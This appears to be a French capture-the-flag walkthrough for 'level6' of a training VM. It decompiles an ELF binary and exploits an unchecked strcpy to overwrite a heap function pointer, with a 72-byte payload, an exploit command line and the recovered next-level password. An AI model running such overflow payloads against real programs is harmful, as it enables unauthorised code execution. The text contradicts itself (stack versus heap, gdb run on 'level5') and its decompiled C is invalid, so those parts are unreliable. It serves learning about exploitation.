# LEVEL 6
## Walkthrough

Voici les étapes suivit pour accéder au niveau supérieur, soit le `level7`.

1. Une fois connecté à la VM sur le `level6`, l'on retrouve un fichier `level6` situé à la racine du dossier utilisateur. Ce dernier s'avère être de nouveau un exécutable ELF (Executable and Linkable Format).

2. On extrait ce fichier sur la machine host soit en utilisant la commande `scp` soit en utilisant un logiciel créer à cet effet.

	```sh
	> scp -P 4242 level6@127.0.0.1:level6 /path/on/machine/host
	```

2. On ouvre ensuite ce fichier dans Ghidra et après analyse, on obtient le désassemblage ci-dessous (que l'on refactorise pour plus de clarté).

    ```sh
	#include <stdlib.h>
	#include <stdio.h>
	#include <string.h>
	#include <unistd.h>
	#include <sys/types.h>

    void n(void)
	{
		system("/bin/cat /home/user/level7/.pass");
		return;
	}

	void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
	{
		puts("Nope");
		return;
	}

	void main(int argc, char** argv)
	{
		char *__dest;
		void **ppcVar1;

		__dest = (char *) malloc(64); # 0x40 = 64 decimal
		ppcVar1 = (void**) malloc(4); # 0x4 = 4 decimal
		*ppcVar1 = m;
		strcpy(__dest, argv[1]);
		void (**ppcVar1)();
		return;
	}
	```

	À partir de ce désassemblage, on en déduit que le programme contient 3 fonctions : la fonction `main`, la fonction `m` et la fonction `n`.

    Dans un premier temps, la fonction main prend en entrée deux paramètres : `ac` de type `int` in `argv` de type `char ***`, soit les paramètres classiques d'un `main` en C . Cette dernière alloue d'abord de la mémoire pour un pointeur `__dest` de `64 octets` (`0x40`) pour stocker des données. Ensuite, elle alloue également de la mémoire pour un pointeur `ppcVar1`, cette fois-ci de `4 octets` (`0x4`). Par la suite, la fonction `main` copie le contenu de la chaîne située à l'adresse `argv[1] + 4` dans l'espace mémoire alloué pour `_dest`. Enfin, la fonction `main` appelle la fonction pointée par `*ppcVar1`, soit la fonction `m`.

    Dans un deuxième temps, la fonction `m` prend cinq paramètres, mais elle n'utilise aucun d'entre eux. En fin de compte, la fonction se contente simplement d'afficher `Nope` dans la sortie standard à l'aide de la fonction `puts` et d'effectuer un `return`.

    Enfin, la fonction `n`, qui ne prends aucun paramètre, se contente, elle, d'appeler la commande système `cat` pour afficher le contenu du fichier `/home/user/level7/.pass`, soit le mot de passe nécessaire pour passer au niveau suivant.

4. L'exploitation de cet exécutable semble de fait assez claire : il va falloir remplacer l'adresse de `m` par celle de `n` dans la variable `ppcVar1` se trouvant dans le `main`. Pour cela, on va devoir `buffer overflow` le `malloc(64)` avec `64 bytes` pour atterrir dans le `malloc(4)` et y écrire l'adresse de `n`. Plus précisément, l'on va exploiter la fonction `strcpy` utilisé pour copier `argv[1]` dans le premier `malloc` : en mettant une valeur trop grande dans `argv[1]` on finit par `buffer overflow` le premier `malloc` et du coup, on arrive dans le second. Ainsi, ici, il ne s'agit non pas de `buffer overflow` la `heap` , mais plutôt la `stack`.

5. Du coup, on récupère l'adresse de la fonction `n` en lançant `gdb` sur l'exécutable `level5` et en exécutant la commande `info function`.

    ```sh
    > gdb level5
    > info function
    [...]
		0x08048454  n
		0x08048468  m
		0x0804847c  main
	[...]
    ```

    Ainsi l'adresse de la fonction `n` s'avère être `0x08048454`.

6. À présent, il va falloir déterminer de combien de `bytes` il va falloir pour réaliser notre `buffer overflow`. Sachant ici qu'il va falloir `buffer overflow` la `heap`, il est important de prendre en compte l'alignement des variables au sein cette dernière. Généralement, la fonction `malloc` ajoute un décalage d'alignement de `8 bytes` entre chaque variable de la `heap`. On va donc devoir `buffer overflow` avec `72 bytes` et non `64 bytes`.

7. Maitenant que l'on a l'adresse de la fonction `n` et le nombre de `bytes` a utilisé pour réaliser notre `buffer overflow` l'on peut commencer à générer notre payload.

    ```sh
    > python -c 'print "A" * 72 + "\x54\x84\x04\x08"'
    ```

	On a :
    - `"A" * 72`: `64 bytes` pour le premier `malloc` plus `8 bytes` pour l'alignement des variables dans la `heap`, soit `72 bytes` au total ;
    - `\x54\x84\x04\x08`: L'adresse de la fonction `n` en format little-endian.

8. Il ne manque plus qu'à exécuter le programme avec la payload que l'on vient de générer pour que la fonction `n` soit appelé à la place de la fonction `m` et d'ainsi effectuer un `cat` sur le mot de passe du niveau suivant, soit le `level7`.

    ```sh
    > ./level6 $(python -c 'print "A" * 72 + "\x54\x84\x04\x08"')
    f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
    ```

9. On peut à présent passer au niveau supérieur en exécutant la commande `su level7` et en y spécifiant le mot de passe qui vient d'être trouvée.

    ```sh
    > su level7
    Password :
	> f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
    ```
